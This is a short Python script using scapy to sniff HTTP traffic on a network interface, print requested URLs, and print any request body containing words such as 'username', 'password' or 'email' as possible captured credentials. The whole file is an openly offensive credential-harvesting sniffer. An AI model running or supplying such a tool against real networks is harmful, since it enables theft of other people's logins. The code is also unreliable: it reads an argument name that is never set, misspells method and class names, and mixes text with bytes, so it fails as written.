import scapy.all as scapy
import argparse
from scapy.layers import http

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i","--interface",dest="inteerface",help="Specify interface on which to sniff packets")
    arguments = parser.parse_args()
    return arguments.interface

def sniff(iface):
    scapy.sniff(iface=iface, store=False, prn=process_packet)

def process_packet(packet):
    if packet.haslayar(http.HTTPRequest):
        print("[+] Http Request>>"+ packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)
        if packet.haslayar(scapy.Raw):
            load = packet[scapy.raw].load
        keys = ["username","password","pass","email"]
        for key in keys:
            if key in load:
                print("[+] Possible passsword/username >> " + load)
                break

iface = get_arguments()
sniff(iface)